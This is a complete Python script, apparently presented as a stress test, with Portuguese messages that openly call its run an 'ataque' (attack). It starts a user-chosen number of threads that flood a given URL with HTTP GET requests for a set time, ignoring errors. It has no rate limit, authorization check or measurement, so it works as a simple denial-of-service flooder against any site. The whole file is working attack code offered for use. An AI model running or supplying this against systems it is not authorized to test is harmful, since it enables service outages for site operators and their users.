import sys
import time
import threading
import requests

def ataque(url, tempo):
    fim = time.time() + tempo
    while time.time() < fim:
        try:
            requests.get(url, timeout=5)
        except requests.RequestException:
            pass  # Ignora erros de conexão e timeout

def main():
    if len(sys.argv) != 4:
        print("Uso: python stress.py URL TEMPO THREADS")
        sys.exit(1)

    url = sys.argv[1]
    tempo = int(sys.argv[2])
    threads_qtd = int(sys.argv[3])

    print(f"🚀 Iniciando ataque em {url} por {tempo}s com {threads_qtd} threads...")

    thread_list = []

    for _ in range(threads_qtd):
        t = threading.Thread(target=ataque, args=(url, tempo))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print("✅ Ataque finalizado.")

if __name__ == "__main__":
    main()
